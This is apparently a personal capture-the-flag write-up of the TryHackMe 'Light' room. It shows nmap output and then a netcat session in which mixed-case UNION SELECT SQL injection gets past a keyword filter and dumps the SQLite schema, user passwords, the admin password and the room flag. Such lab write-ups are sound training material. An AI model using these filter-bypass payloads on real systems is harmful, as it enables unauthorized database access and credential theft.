
[[TryHackMe]] Room

**Date**: 10/02/25
**Target IP**: 10.10.172.39

I am working on a database application called Light! Would you like to try it out?  
If so, the application is running on **port 1337**. You can connect to it using `nc 10.10.172.39 1337`  
You can use the username `smokey` in order to get started.

---
## **Initial Scanning

### [[nmap]]

22/tcp open  ssh     syn-ack ttl 61 OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

1337/tcp open  waste?  syn-ack ttl 61

---
## **Exploration**

```shell
❯ nc 10.10.172.39 1337
Welcome to the Light database!
Please enter your username: smokey
Password: vYQ5ngPpw8AdUmL
```


```
Please enter your username: SELECT version() 
Ahh there is a word in there I don't like :(
Please enter your username: SeLect version()     
Username not found.
Please enter your username: SeLect @@version
Username not found.
Please enter your username: ' UNION SELECT 1'--
For strange reasons I can't explain, any input containing /*, -- or, %0b is not allowed :)
Please enter your username: ' UNION SELECT 1'
Ahh there is a word in there I don't like :(
Please enter your username: ' UniOn SeLect 1'
Password: 1
```

We see that in the last entry we manage to obtain a UNION SELECT SQLi.  We now know SQLi is possible and the DB is an SQL-based DB.

---
## **Exploitation**

```
Please enter your username: ' UniOn SeLECT @@version'
Error: unrecognized token: "@"
Please enter your username: ' UniOn SElECT sqlite_version()'     
Password: 3.31.1
```

We see that the back-end DB is SQLite.

We can now use common SQLite SQLi payloads as follows.

```
Please enter your username: ' UniOn SElECT sql FROM sqlite_master'
Password: CREATE TABLE admintable (
                   id INTEGER PRIMARY KEY,
                   username TEXT,
                   password INTEGER)

Please enter your username: ' UniOn SElECT group_concat(sql) FROM sqlite_master'
Password: CREATE TABLE usertable (
                   id INTEGER PRIMARY KEY,
                   username TEXT,
                   password INTEGER),CREATE TABLE admintable (
                   id INTEGER PRIMARY KEY,
                   username TEXT,
                   password INTEGER)
                   
Please enter your username: ' UniOn SElECT group_concat(username,password) FROM usertable'
Password: aliceyAn4fPaF2qpCKpRrobe74tqwRh2oApPo6john7DV4dwA0g5FacRemichaelvYQ5ngPpw8AdUmLsmokeyEcSuU35WlVipjXGhazelYO1U9O1m52aJImAralphWObjufHX1foR8d7steve

Please enter your username: ' UniOn SElECT group_concat(password) FROM admintable'
Password: mamZtAuMlrsEy5bp6q17,THM{SQLit3_InJ3cTion_is_SimplE_nO?}

Please enter your username: ' UniOn SElECT * FROM admintable'
Error: SELECTs to the left and right of UNION do not have the same number of result columns

Please enter your username: ' UniOn SElECT username FROM admintable'
Password: TryHackMeAdmin

Please enter your username: TryHackMeAdmin
Username not found.

Please enter your username: ' UniOn SElECT password FROM admintable'
Password: THM{SQLit3_InJ3cTion_is_SimplE_nO?}
```

---
## **Summary**

- SQLite Back-end DB
- admintable and usertable
- Admin username : TryHackMeAdmin
- Admin password : mamZtAuMlrsEy5bp6q17
- Flag : THM{SQLit3_InJ3cTion_is_SimplE_nO?}

